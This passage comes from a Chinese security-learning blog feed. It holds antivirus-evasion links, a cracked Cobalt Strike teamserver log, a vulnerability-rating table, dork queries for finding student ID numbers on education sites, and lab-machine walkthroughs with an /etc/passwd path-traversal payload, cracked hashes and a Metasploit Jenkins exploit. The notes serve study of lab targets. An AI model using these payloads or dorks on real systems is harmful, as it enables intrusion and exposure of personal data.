language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error: &quot;</span> + textStatus + <span class="string">&quot; - &quot;</span> + errorThrown);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还需要chrome 插件allow cors</p>
<p>大概是这样搞，还存在一些问题，之后在修复</p>
]]></content>
      <tags>
        <tag>前端 ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意代码</title>
    <url>/2023/04/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p><a href="https://github.com/Rvn0xsy/BadCode">Rvn0xsy&#x2F;BadCode: 恶意代码逃逸源代码 http://payloads.online (github.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://payloads.online/">倾旋的博客 (payloads.online)</a></p>
<p><a href="https://payloads.online/archivers/2019-11-10/1/">静态恶意代码逃逸（第一课） « 倾旋的博客 (payloads.online)</a></p>
<p><a href="https://github.com/luckyfuture0177/ReZeroBypassAV">luckyfuture0177&#x2F;ReZeroBypassAV: 从零开始学免杀 (github.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1A44y1p7Lc/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">cobaltstrike免杀测试合集_哔哩哔哩_bilibili</a></p>
<p><a href="https://live.freebuf.com/detail/0610e4ba260f2055969a1f54ffba4486">漏洞挖掘神器训练营 - FreeBuf公开课 | 回归真知</a></p>
<p>cobalstrike环境搭建：</p>
<p>直接使用之前下载的全功能win10</p>
<p>linux端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.222.132 kali  random.profile                                                                                                                                                    130 ⨯</span><br><span class="line">[*] Will use existing X509 certificate and keystore (for SSL)</span><br><span class="line">[CSAgent] PreMain transform fucked up: javassist.bytecode.DuplicateMemberException: duplicate method: hex2bytes in common.Authorization</span><br><span class="line">[+] I see you&#x27;re into threat replication. random.profile loaded.</span><br><span class="line">[*] Loading properties file (/home/kali/Desktop/CobaltStrike_4.4_dog/TeamServer.prop).</span><br><span class="line">[!] Properties file (/home/kali/Desktop/CobaltStrike_4.4_dog/TeamServer.prop) was not found.</span><br><span class="line">[+] Team server is up on 0.0.0.0:6044</span><br><span class="line">[*] SHA256 hash of SSL cert is: 4a96b15ffd482e8e37b0430af4ff6c3e3ac0125d009956f0655535fbba29cf07</span><br></pre></td></tr></table></figure>

<p>windows端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./start.sh</span><br><span class="line"></span><br><span class="line">输入对应配置</span><br></pre></td></tr></table></figure>

<p>效果检测：360安全卫士、火绒杀毒、VT（<a href="https://www.virustotal.com/gui/home/upload">VirusTotal - Home</a>）</p>
<p><a href="https://www.codenong.com/cs106112057/">免杀篇远控免杀专题(49)-白名单Xwizard.exe执行payload | 码农家园 (codenong.com)</a></p>
<h2 id="初识恶意代码"><a href="#初识恶意代码" class="headerlink" title="初识恶意代码"></a>初识恶意代码</h2><p><a href="https://www.freebuf.com/column/231663.html">Shellcode编程——编写自己想要功能的Shellcode - FreeBuf网络安全行业门户</a></p>
]]></content>
      <tags>
        <tag>学习杀与免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞整理</title>
    <url>/2023/03/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>其实漏洞是通用的，不管是APP、微信小程序、公众号、网页了，这里细分一点主要是方便我进行一个记录。</p>
<h2 id="小程序公众号漏洞："><a href="#小程序公众号漏洞：" class="headerlink" title="小程序公众号漏洞："></a>小程序公众号漏洞：</h2><p><a href="https://juejin.cn/post/7202583557750603833">微信小程序解包+反编译 - 掘金 (juejin.cn)</a></p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE">小程序配置 | 微信开放文档 (qq.com)</a></p>
<p><a href="https://blog.csdn.net/wapqke/article/details/118312263">微信小程序如何进行反编译详细教程_小程序反编译_陆大湿的博客-CSDN博客</a></p>
<p><a href="https://www.yeshen.com/faqs/S1ogLqZgW">夜神内微信搜索、扫二维码异常解决办法_夜神安卓模拟器新手帮助页 (yeshen.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1vU4y1r73j/?spm_id_from=888.80997.embed_other.whitelist">WX小程序反编译教程及解包教程和解包工具使用 大家看完记得三连哦 三连完了问我要工具哦_哔哩哔哩_bilibili</a></p>
<p>小程序反编译（有可能小程序里面源码有key类似的东西）</p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">敏感信息泄露</td>
<td align="center"></td>
<td align="center">等级看泄露的什么来判</td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center">低</td>
<td align="center">访问控制问题</td>
</tr>
<tr>
<td align="center">验证码功能缺陷</td>
<td align="center">中</td>
<td align="center">防护机制问题</td>
</tr>
<tr>
<td align="center">Tomcat_AJP任意文件读取漏洞</td>
<td align="center">高</td>
<td align="center">访问控制问题，CVE-2020-1938</td>
</tr>
<tr>
<td align="center">同一时间能够对大量手机号发送短信验证码</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">短信验证码绕过</td>
<td align="center">低</td>
<td align="center">如果有号码加密，有的时候可以看到加密可以复用加密内容，然后越权</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">泄露中间件及版本（这都收</td>
</tr>
<tr>
<td align="center">暗链</td>
<td align="center">中</td>
<td align="center">网页中存在不是自己业务的域名，毫无相干</td>
</tr>
<tr>
<td align="center">内网地址泄露</td>
<td align="center">低</td>
<td align="center">js文件中可能存在内网地址</td>
</tr>
<tr>
<td align="center">短信验证码不失效</td>
<td align="center">低</td>
<td align="center">重新发了新的验证码，但是旧的验证码没失效，可以提高爆破概率</td>
</tr>
<tr>
<td align="center">未授权访问</td>
<td align="center">中</td>
<td align="center">直接访问对应url发现未授权访问</td>
</tr>
<tr>
<td align="center">shiro反序列化</td>
<td align="center">高</td>
<td align="center">可以RCE</td>
</tr>
<tr>
<td align="center">越权</td>
<td align="center">高</td>
<td align="center">修改ID可以看到别人信息</td>
</tr>
<tr>
<td align="center">文件上传</td>
<td align="center">高</td>
<td align="center">如果有可以jsp、php类似的都试一下</td>
</tr>
<tr>
<td align="center">php敏感信息泄露</td>
<td align="center">高</td>
<td align="center">可以先burp抓包得到公众号域名，然后使用jsfinder来扫url</td>
</tr>
</tbody></table>
<h1 id="web漏洞："><a href="#web漏洞：" class="headerlink" title="web漏洞："></a>web漏洞：</h1><p>等级判定可参考：<a href="https://help.aliyun.com/document_detail/40067.html">https://help.aliyun.com/document_detail/40067.html</a></p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">短信验证码可暴力破解</td>
<td align="center">中</td>
<td align="center">开发人员一般依赖于HTTP Host header。</td>
</tr>
<tr>
<td align="center">url重定向漏洞</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">文件绝对路径泄露也算</td>
</tr>
<tr>
<td align="center">cookies敏感信息泄露</td>
<td align="center">低</td>
<td align="center">这都算（</td>
</tr>
<tr>
<td align="center">Host头攻击</td>
<td align="center">中</td>
<td align="center">例如，在php里用_SERVER[“HTTP_HOST”]。但是这个header是不可信赖的，如果应用程序没有对host header值进行处理，就有可能造成恶意代码的传入。</td>
</tr>
<tr>
<td align="center">登录绕过</td>
<td align="center">高</td>
<td align="center">只要用户名对就可登录，密码无所谓（还能有这种情况</td>
</tr>
<tr>
<td align="center">明文传输</td>
<td align="center">中</td>
<td align="center">未对传输的账号密码进行加密且未使用https</td>
</tr>
<tr>
<td align="center">SL证书认证文件</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">滑块验证码失效</td>
<td align="center">中</td>
<td align="center">滑块失效</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">error.log</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">nginx-status</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">前端加密方法泄露也算</td>
</tr>
<tr>
<td align="center">存储型XSS</td>
<td align="center">高</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">弱口令</td>
<td align="center">高</td>
<td align="center">弱口令竟然都算高</td>
</tr>
<tr>
<td align="center">验证码失效</td>
<td align="center">中</td>
<td align="center">验证码没在服务器端验证</td>
</tr>
<tr>
<td align="center">crossdomain.xml文件配置不当</td>
<td align="center">中</td>
<td align="center">可能导致csrf</td>
</tr>
<tr>
<td align="center">反射型xss</td>
<td align="center">中</td>
<td align="center">恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的</td>
</tr>
<tr>
<td align="center">逻辑漏洞之任意用户登录</td>
<td align="center">高</td>
<td align="center">修改返回包直接登录</td>
</tr>
<tr>
<td align="center">暴力破解</td>
<td align="center">中</td>
<td align="center">密码错误长度相同，且多次爆破没返回次数限制</td>
</tr>
<tr>
<td align="center">越权访问</td>
<td align="center">低</td>
<td align="center">根据越权修改ID获取他人余额(看到有的等级是高</td>
</tr>
<tr>
<td align="center">内网IP地址泄露</td>
<td align="center">低</td>
<td align="center">直接返回IP而不是域名，惊（注释的内网IP泄露竟然也算</td>
</tr>
<tr>
<td align="center">Fastjson反序列化漏洞</td>
<td align="center">中</td>
<td align="center">可以dnslog验证，（看到json数据传输可以试试看是不是fastjson，也是其一个特征，<a href="https://cloud.tencent.com/developer/article/1957185">浅析FastJSON反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></td>
</tr>
<tr>
<td align="center">信息泄露</td>
<td align="center">低|高</td>
<td align="center">破坏请求头结构，使得报错，返回详细报错信息（等级看泄露东西的严重性</td>
</tr>
<tr>
<td align="center">链接注入漏洞</td>
<td align="center">中</td>
<td align="center">感觉属于xss，但可以点击链接跳转（确实，同一个点刷了两个洞</td>
</tr>
<tr>
<td align="center">任意文件上传</td>
<td align="center">中</td>
<td align="center">上传任意后缀文件</td>
</tr>
<tr>
<td align="center">CSRF</td>
<td align="center">中</td>
<td align="center">对应表单，burp抓包，bp CSRF POC构造</td>
</tr>
<tr>
<td align="center">未授权访问</td>
<td align="center">中|高</td>
<td align="center">直接不需要登录就管理界面，加token等</td>
</tr>
<tr>
<td align="center">软件压缩目录泄露</td>
<td align="center">中</td>
<td align="center">可以多扫目录试试</td>
</tr>
<tr>
<td align="center">Webpack源码泄漏</td>
<td align="center">中</td>
<td align="center">webpack是一个打包器，能将多个文件打包成一个文件。（在源代码处看到webpack可以仔细检查确定是否存在该漏洞</td>
</tr>
<tr>
<td align="center">CORS</td>
<td align="center">中</td>
<td align="center">特征：Access-Control-Allow-Origin：*，cors漏洞一般用于窃取用户敏感数据</td>
</tr>
<tr>
<td align="center">tomcat示例目录未删除</td>
<td align="center">低</td>
<td align="center">*&#x2F;docs&#x2F;，存在说明文档</td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center">低</td>
<td align="center">利用该信息可以更容易得到网站权限</td>
</tr>
<tr>
<td align="center">spring-boot端点未授权</td>
<td align="center">高</td>
<td align="center">例如：*&#x2F;prod-api&#x2F;actuator&#x2F;env，会泄露敏感信息；特征：左上角绿叶，对应报错信息；参考：<a href="https://blog.csdn.net/guo15890025019/article/details/119885737">Spring Boot Actuator未授权访问漏洞利用_springboot漏洞利用_大鸟安全的博客-CSDN博客</a></td>
</tr>
<tr>
<td align="center">图形验证码失效</td>
<td align="center">中</td>
<td align="center">使用相同验证码多次重发，验证码仍可用</td>
</tr>
<tr>
<td align="center">中间件版本泄露</td>
<td align="center">低</td>
<td align="center">一般不收</td>
</tr>
<tr>
<td align="center">批量提交</td>
<td align="center">中</td>
<td align="center">表单重复提交，会造成数据重复，增加服务器负载，严重甚至会造成服务器宕机（这都算</td>
</tr>
<tr>
<td align="center">swagger未授权</td>
<td align="center">高</td>
<td align="center"><a href="https://cloud.tencent.com/developer/article/2160217">Swagger未授权访问漏洞 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>，会暴露接口地址，从而可能被进行利用</td>
</tr>
<tr>
<td align="center">短信验证码爆破漏洞</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">用户名枚举</td>
<td align="center">低</td>
<td align="center">可以根据验证码结合，当用户存在会发验证码，不存在不会发</td>
</tr>
<tr>
<td align="center">Thymeleaf远程命令执行</td>
<td align="center">高</td>
<td align="center">若依CMS</td>
</tr>
<tr>
<td align="center">接口文档泄露</td>
<td align="center">高</td>
<td align="center">有的XML文档包含接口也算</td>
</tr>
<tr>
<td align="center">phpinfo界面泄露</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Nginx主机实时监控流量数据泄露</td>
<td align="center">高</td>
<td align="center">*&#x2F;statusicon&#x2F;</td>
</tr>
<tr>
<td align="center">Source Map</td>
<td align="center">中</td>
<td align="center">*.js.map</td>
</tr>
<tr>
<td align="center">Springboot Snake YAML</td>
<td align="center">高</td>
<td align="center">反弹shell</td>
</tr>
<tr>
<td align="center">上传jspgetshell</td>
<td align="center">高</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">逻辑漏洞</td>
<td align="center">高</td>
<td align="center">一般余额都是保留到分(也就是0.00)，充值0.019如果平台校验有问题会四舍五入，然后白嫖一分。</td>
</tr>
<tr>
<td align="center">刷赞</td>
<td align="center">中</td>
<td align="center">turbo intruder 模式下进行并发 选择race.py，在数据包任意位置加上%s 攻击</td>
</tr>
<tr>
<td align="center">添加现在</td>
<td align="center">高</td>
<td align="center">turbo intruder 模式下进行并发 选择race.py</td>
</tr>
<tr>
<td align="center">不收限制的资源调用</td>
<td align="center">高</td>
<td align="center">调用接口消耗资源，爆破信息</td>
</tr>
<tr>
<td align="center">短信验证码复用漏洞</td>
<td align="center">低</td>
<td align="center">登录成功后不失效</td>
</tr>
<tr>
<td align="center">验证码与手机号未绑定</td>
<td align="center">高</td>
<td align="center">未绑定手机号，任意修改密码</td>
</tr>
<tr>
<td align="center">验证码爆破</td>
<td align="center">高</td>
<td align="center">手机号码前后加空格，86，086，0086，+86，0，00，&#x2F;r,&#x2F;n, 以及特殊符号等。或者url编码</td>
</tr>
<tr>
<td align="center">csrf</td>
<td align="center">高</td>
<td align="center">使用cookie等本地凭证在<img>打等</td>
</tr>
<tr>
<td align="center">逻辑并发</td>
<td align="center">中</td>
<td align="center">领东西的时候并发测试</td>
</tr>
<tr>
<td align="center">时间校验漏洞</td>
<td align="center">中</td>
<td align="center">某些会员通过本地时间判断</td>
</tr>
<tr>
<td align="center">手机验证码回显</td>
<td align="center">中</td>
<td align="center">（没见到谁这么干过</td>
</tr>
<tr>
<td align="center">首单优惠绕过</td>
<td align="center">中</td>
<td align="center">优惠数据包重发</td>
</tr>
<tr>
<td align="center">xss</td>
<td align="center">中</td>
<td align="center">上传html文件中有xss，路径随机但host相同也算（竟然都要算</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">匿名用户uid泄露等，身份证暴露等</td>
</tr>
<tr>
<td align="center">邮箱轰炸</td>
<td align="center">中</td>
<td align="center">还以为只有短信轰炸才算</td>
</tr>
<tr>
<td align="center">越权</td>
<td align="center">中</td>
<td align="center">订单收获地址一般都有</td>
</tr>
</tbody></table>
<h2 id="APP漏洞："><a href="#APP漏洞：" class="headerlink" title="APP漏洞："></a>APP漏洞：</h2><p><del>等我学习了在更新</del></p>
<h2 id="公众号小程序漏洞"><a href="#公众号小程序漏洞" class="headerlink" title="公众号小程序漏洞"></a>公众号小程序漏洞</h2><h2 id="SRC挖掘技巧"><a href="#SRC挖掘技巧" class="headerlink" title="SRC挖掘技巧"></a>SRC挖掘技巧</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>多看burp http-history看</p>
<p>jsfind</p>
<p>控制台</p>
<h3 id="利用fofa语法"><a href="#利用fofa语法" class="headerlink" title="利用fofa语法"></a>利用fofa语法</h3><p>“系统” &amp;&amp; org&#x3D;”China Education and Research Network Center”，我们可以看见红色框内是有很多图标，这些有可能就是系统的指纹，fofa直接给你归纳好的，现在我们只需要一个一个图标打开然后用傻瓜式渗透顺序打一通</p>
<p><a href="https://zhuanlan.zhihu.com/p/622876836">FOFA入门指南：轻松掌握搜索技巧和特色功能 - 知乎 (zhihu.com)</a></p>
<h3 id="查看开发商排行榜"><a href="#查看开发商排行榜" class="headerlink" title="查看开发商排行榜"></a>查看开发商排行榜</h3><p>edu平台的跟新，我发现他多了一个开发商排行，这样等于是给我们列出来了edu用户的系统公司，就可以节省我们的时间再去查找开发商来找对应的系统，确定系统寻找手册弱口令</p>
<h3 id="利用谷歌hacking、咸鱼、github搜集敏感信息"><a href="#利用谷歌hacking、咸鱼、github搜集敏感信息" class="headerlink" title="利用谷歌hacking、咸鱼、github搜集敏感信息"></a>利用谷歌hacking、咸鱼、github搜集敏感信息</h3><p>site:.edu.cn sfz  filetype: pdf|xls|doc</p>
<p>site:edu.cn (filetype:pdf OR filetype:xls OR filetype:doc)</p>
<p>学号 工号 身份证</p>
<p>去找所在学校相关的教育局站点，因为助学金等奖励都会通过当地教育局进行展开，这样在相关教育局站点我们也可以收集到我们需要的信息，当然你也可以加入班群，表白墙等容易泄露信息的地方。高校网站找找到门户服务网站，此时一定要注意门户网站的帮助</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>关注漏洞库：<a href="http://www.i-dock.net/">PeiQi文库 (i-dock.net)</a>，有网站测绘，即搜索语法使用起来还挺方便</p>
<h2 id="github信息收集"><a href="#github信息收集" class="headerlink" title="github信息收集"></a>github信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gtihub搜索语法:</span><br><span class="line">in:name baidu              #标题搜索含有关键字baidu</span><br><span class="line">in:descripton baidu         #仓库描述搜索含有关键字</span><br><span class="line">in:readme baidu             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 baidu           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 baidu      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 baidu           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 baidu      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 baidu           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 baidu    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 baidu   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:name                  #用户名搜素</span><br><span class="line">license:apache-2.0 baidu    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java baidu         #在java语言的代码中搜索关键字</span><br><span class="line">user:baidu in:name baidu     #组合搜索,用户名baidu的标题含有baidu的</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories">https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories</a></p>
<p>自动化工具GitDorker: <a href="https://github.com/obheda12/GitDorker%EF%BC%88%E6%B2%A1%E5%AE%89%E6%84%9F%E8%A7%89%E8%87%AA%E5%B7%B1%E6%89%8B%E5%B7%A5github%E6%90%9C%E4%B9%9F%E8%A1%8C%EF%BC%89">https://github.com/obheda12/GitDorker（没安感觉自己手工github搜也行）</a></p>
]]></content>
      <tags>
        <tag>漏洞整理</tag>
      </tags>
  </entry>
  <entry>
    <title>八股文</title>
    <url>/2023/04/04/%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="74d085d9015d956f44dc6ba734e0734d6389ff381ea7bcd0ba40a7a02ae2abfc"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>面筋</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝队</title>
    <url>/2023/04/08/%E8%93%9D%E9%98%9F/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>蓝队学习</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机玩耍</title>
    <url>/2023/03/16/%E9%9D%B6%E6%9C%BA%E7%8E%A9%E8%80%8D/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>
<h3 id="nmap-扫服务"><a href="#nmap-扫服务" class="headerlink" title="nmap 扫服务"></a>nmap 扫服务</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png" alt="image-20230316092242512"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class="line">    PORT     STATE SERVICE VERSION</span><br><span class="line">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">    10123/tcp open  unknown</span><br><span class="line">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Linux 3.X|4.X|5.X</span><br><span class="line">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class="line">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="访问ftp"><a href="#访问ftp" class="headerlink" title="访问ftp"></a>访问ftp</h3><p>匿名 （获得对应文件）（命令行访问记得输入binary命令，防止破坏可执行文件）</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092603021.png" alt="image-20230316092603021"></p>
<h3 id="访问web"><a href="#访问web" class="headerlink" title="访问web"></a>访问web</h3><h4 id="目录爆破：dirb、gobuster、feroxbuster"><a href="#目录爆破：dirb、gobuster、feroxbuster" class="headerlink" title="目录爆破：dirb、gobuster、feroxbuster"></a>目录爆破：dirb、gobuster、feroxbuster</h4><p>使用dirb爆破找到<a href="http://192.168.1.28/administrator/installation/">http://192.168.1.28/administrator/installation/</a></p>
<p>数据库创建失败</p>
<p>开始看cms（cuppa）有漏洞没有</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br><span class="line">searchsploit  cuppa cms -m 25791  </span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E5%A4%B1%E8%B4%A5">http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd失败</a></p>
<p><a href="http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 失败</p>
<p><a href="http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 成功显示（但没有东西）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl    --data-urlencode urlConfig=../../../../../../../../../etc/passwd  http://192.168.1.28/administrator/alerts/alertConfigField.php  （需要post）</span><br></pre></td></tr></table></figure>

<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>sudo 提权</p>
<p>可以ftp提权，也可以sudo &#x2F;bin&#x2F;bash，也可也sudo time &#x2F;root&#x2F;flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316093047508.png" alt="image-20230316093047508"></p>
<p>成功</p>
<h2 id="jarbas"><a href="#jarbas" class="headerlink" title="jarbas"></a>jarbas</h2><ul>
<li><p>先nmap扫描</p>
<ul>
<li><p>得到靶机IP 192.168.1.30<img src="https://api2.mubu.com/v3/document_image/e874e4e1-6981-469c-9d66-09d0b8a0c953-18494357.jpg" alt="img"></p>
</li>
<li><p>全面的扫：sudo nmap –min-rate 10000  -p-  192.168.1.30<img src="https://api2.mubu.com/v3/document_image/24460aa6-3cc1-49bc-b10b-ca3e1d063731-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.1.30 （TCP）<img src="https://api2.mubu.com/v3/document_image/271e47c1-d865-4c73-bed1-174f348dc01f-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo nmap -sU -sV -O -p22,80,3306,8080 192.168.1.30 （UDP）<img src="https://api2.mubu.com/v3/document_image/e1f93768-df56-4fd4-8ba9-baf8e8ad45e7-18494357.jpg" alt="img"></p>
</li>
<li><p>扫描漏洞：sudo nmap –script&#x3D;vuln -p22,80,3306,8080 192.168.1.30<img src="https://api2.mubu.com/v3/document_image/ebe9376e-7eec-40ff-bf55-af408cf9a039-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>80端口web服务</p>
<ul>
<li><p>dirb 扫描dirb <a href="http://192.168.1.30/">http://192.168.1.30:80</a>   -X .html -o output.txt  (可以多试下看加不加.html)<img src="https://api2.mubu.com/v3/document_image/1b8ee47f-7a60-4979-b382-f8dd852407b9-18494357.jpg" alt="img"></p>
</li>
<li><p>访问access<img src="https://api2.mubu.com/v3/document_image/fac7740e-0279-49e8-9c15-63af5e4734a9-18494357.jpg" alt="img"></p>
</li>
<li><p>hash解密</p>
<ul>
<li><p>看类型（md5）<img src="https://api2.mubu.com/v3/document_image/4635c79e-b18f-4768-be95-8402052db235-18494357.jpg" alt="img"></p>
</li>
<li><p>解密</p>
<ul>
<li><p>tiago:5978a63b4654c73c60fa24f836386d87：italia99</p>
</li>
<li><p>trindade:f463f63616cb3f1e81ce46b39f882fd5：marianna</p>
</li>
<li><p>eder:9b38e2b1e8b12f426b0d208a7ab6cb98：vipsu</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>8080端口处理</p>
<ul>
<li><p>使用之前三组密码登录，最后一组可以<img src="https://api2.mubu.com/v3/document_image/939d0297-acfe-42a1-9a21-61839f2adf3f-18494357.jpg" alt="img"></p>
</li>
<li><p>jenkins尝试使用msf攻击<img src="https://api2.mubu.com/v3/document_image/b0650d15-a14f-410d-8e88-5e444e4ffcbf-18494357.jpg" alt="img"></p>
</li>
<li><p>use exploit&#x2F;multi&#x2F;http&#x2F;jenkins_script_console</p>
</li>
<li><p>show options（注意lport不要设成4444）<img src="https://api2.mubu.com/v3/document_image/cf0e5e49-a74e-4ab7-b332-523dd9eebafb-18494357.jpg" alt="img"></p>
</li>
<li><p>成功得到shell<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/38f69a88-a519-432d-a4be-458890219659-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="sickos2"><a href="#sickos2" class="headerlink" title="sickos2"></a>sickos2</h2><ul>
<li><p>目标探测</p>
<ul>
<li><p>──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ sudo nmap  -sV -sT -O  -p22,80 192.168.0.105</p>
</li>
